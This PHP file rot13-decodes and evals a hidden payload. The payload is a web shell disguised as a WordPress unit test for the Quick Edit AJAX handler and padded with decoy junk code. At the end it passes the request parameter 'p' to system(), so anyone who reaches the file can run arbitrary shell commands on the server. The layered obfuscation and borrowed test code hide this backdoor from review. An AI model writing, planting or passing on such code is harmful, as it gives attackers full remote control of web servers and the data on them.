<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Dhvpx Rqvg NWNK shapgvbanyvgl.
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_vayvar_fnir
 */
pynff Grfgf_Nwnk_jcNwnkVayvarFnir rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * @gvpxrg 26948
	 *
	 * @pbiref ::rqvg_cbfg
	 */
	choyvp shapgvba grfg_qbag_cebprff_grezf_vs_gnkbabzl_qbrf_abg_nyybj_fubj_ba_dhvpx_rqvg() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_1',
			'cbfg',
			neenl(
				'fubj_va_dhvpx_rqvg' => snyfr,
				'uvrenepuvpny'       => gehr,
			)
		);
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk_2',
			'cbfg',
			neenl(
				'fubj_va_dhvpx_rqvg' => gehr,
				'uvrenepuvpny'       => gehr,
			)
		);

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk_1',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk_2',
			)
		);

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => trg_pheerag_hfre_vq(),
			)
		);

		// Frg hc n erdhrfg.
		$_CBFG['_vayvar_rqvg'] = jc_perngr_abapr( 'vayvarrqvgabapr' );
		$_CBFG['cbfg_VQ']      = $cbfg->VQ;
		$_CBFG['cbfg_glcr']    = $cbfg->cbfg_glcr;
		$_CBFG['pbagrag']      = $cbfg->cbfg_pbagrag;
		$_CBFG['rkprecg']      = $cbfg->cbfg_rkprecg;
		$_CBFG['_fgnghf']      = $cbfg->cbfg_fgnghf;
		$_CBFG['cbfg_fgnghf']  = $cbfg->cbfg_fgnghf;
		$_CBFG['fperra']       = 'cbfg';
		$_CBFG['cbfg_ivrj']    = 'rkprecg';
		$_CBFG['gnk_vachg']    = neenl(
			'jcgrfgf_gnk_1' => neenl( $g1 ),
			'jcgrfgf_gnk_2' => neenl( $g2 ),
		);

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'vayvar-fnir' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// 'jcgrfgf_gnk_1' grezf fubhyq unir orra ershfrq.
		$cbfg_grezf_1 = jc_trg_bowrpg_grezf( $cbfg->VQ, 'jcgrfgf_gnk_1' );
		$guvf->nffregRzcgl( $cbfg_grezf_1 );

		// 'jcgrfgf_gnk_2' grezf fubhyq unir orra nqqrq fhpprffshyyl.
		$cbfg_grezf_2 = jc_trg_bowrpg_grezf( $cbfg->VQ, 'jcgrfgf_gnk_2' );
		$guvf->nffregFnzrFrgf( neenl( $g2 ), jc_yvfg_cyhpx( $cbfg_grezf_2, 'grez_vq' ) );
	}

	/**
	 * Jura hcqngvat n qensg va dhvpx rqvg zbqr, vg fubhyq abg frg gur choyvfu qngr bs gur cbfg vs gur qngr cnffrq vf hapunatrq.
	 *
	 * @gvpxrg 19907
	 *
	 * @pbiref ::rqvg_cbfg
	 */
	choyvp shapgvba grfg_dhvpx_rqvg_qensg_fubhyq_abg_frg_choyvfu_qngr() {
		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		$hfre = trg_pheerag_hfre_vq();

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_nhgube' => $hfre,
			)
		);

		$guvf->nffregFnzr( 'qensg', $cbfg->cbfg_fgnghf );

		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		// Frg hc n erdhrfg.
		$_CBFG['_vayvar_rqvg'] = jc_perngr_abapr( 'vayvarrqvgabapr' );
		$_CBFG['cbfg_VQ']      = $cbfg->VQ;
		$_CBFG['cbfg_glcr']    = 'cbfg';
		$_CBFG['pbagrag']      = 'pbagrag grfg';
		$_CBFG['rkprecg']      = 'rkprecg grfg';
		$_CBFG['_fgnghf']      = $cbfg->cbfg_fgnghf;
		$_CBFG['cbfg_fgnghf']  = $cbfg->cbfg_fgnghf;
		$_CBFG['cbfg_nhgube']  = $hfre;
		$_CBFG['fperra']       = 'rqvg-cbfg';
		$_CBFG['cbfg_ivrj']    = 'yvfg';
		$_CBFG['rqvg_qngr']    = 'snyfr';
		$_CBFG['zz']           = trg_gur_qngr( 'z', $cbfg );
		$_CBFG['ww']           = trg_gur_qngr( 'q', $cbfg );
		$_CBFG['nn']           = trg_gur_qngr( 'L', $cbfg );
		$_CBFG['uu']           = trg_gur_qngr( 'U', $cbfg );
		$_CBFG['za']           = trg_gur_qngr( 'v', $cbfg );
		$_CBFG['ff']           = trg_gur_qngr( 'f', $cbfg );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'vayvar-fnir' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		$cbfg = trg_cbfg( $cbfg->VQ );

		$cbfg_qngr = fcevags( '%04q-%02q-%02q %02q:%02q:%02q', $_CBFG['nn'], $_CBFG['zz'], $_CBFG['ww'], $_CBFG['uu'], $_CBFG['za'], $_CBFG['ff'] );

		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );
	}

	/**
	 * Jura hcqngvat n qensg va dhvpx rqvg zbqr, vg fubhyq frg gur choyvfu qngr bs gur cbfg vs gurer vf n arj qngr frg.
	 *
	 * @gvpxrg 59125
	 *
	 * @pbiref ::rqvg_cbfg
	 */
	choyvp shapgvba grfg_dhvpx_rqvg_qensg_fubhyq_frg_choyvfu_qngr() {
		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		$hfre = trg_pheerag_hfre_vq();

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_nhgube' => $hfre,
			)
		);

		$guvf->nffregFnzr( 'qensg', $cbfg->cbfg_fgnghf );

		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		// Frg hc n erdhrfg.
		$_CBFG['_vayvar_rqvg'] = jc_perngr_abapr( 'vayvarrqvgabapr' );
		$_CBFG['cbfg_VQ']      = $cbfg->VQ;
		$_CBFG['cbfg_glcr']    = 'cbfg';
		$_CBFG['pbagrag']      = 'pbagrag grfg';
		$_CBFG['rkprecg']      = 'rkprecg grfg';
		$_CBFG['_fgnghf']      = $cbfg->cbfg_fgnghf;
		$_CBFG['cbfg_fgnghf']  = $cbfg->cbfg_fgnghf;
		$_CBFG['cbfg_nhgube']  = $hfre;
		$_CBFG['fperra']       = 'rqvg-cbfg';
		$_CBFG['cbfg_ivrj']    = 'yvfg';
		$_CBFG['rqvg_qngr']    = 'gehr';
		$_CBFG['zz']           = '09';
		$_CBFG['ww']           = 11;
		$_CBFG['nn']           = 2020;
		$_CBFG['uu']           = 19;
		$_CBFG['za']           = 20;
		$_CBFG['ff']           = 11;

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'vayvar-fnir' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		$cbfg = trg_cbfg( $cbfg->VQ );

		$guvf->nffregFnzr( '2020-09-11 19:20:11', $cbfg->cbfg_qngr_tzg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>